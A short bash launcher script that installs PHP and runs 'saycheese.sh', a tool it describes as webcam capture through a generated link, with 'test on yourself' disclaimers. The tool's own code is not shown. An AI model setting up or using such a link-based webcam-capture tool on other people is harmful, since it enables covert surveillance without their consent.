#!/bin/bash

echo "========================================="
echo "       SAYCHEESE - Webcam Capture"
echo "   Educational - Test on YOURSELF only"
echo "========================================="
echo ""

cd ~/saycheese

# Check if PHP is installed
if ! command -v php &> /dev/null; then
    echo "Installing PHP..."
    pkg install php -y
fi

# Run saycheese
bash saycheese.sh

echo ""
echo "NOTE: Only use the generated link on YOURSELF"
echo "Using on others without consent is ILLEGAL"
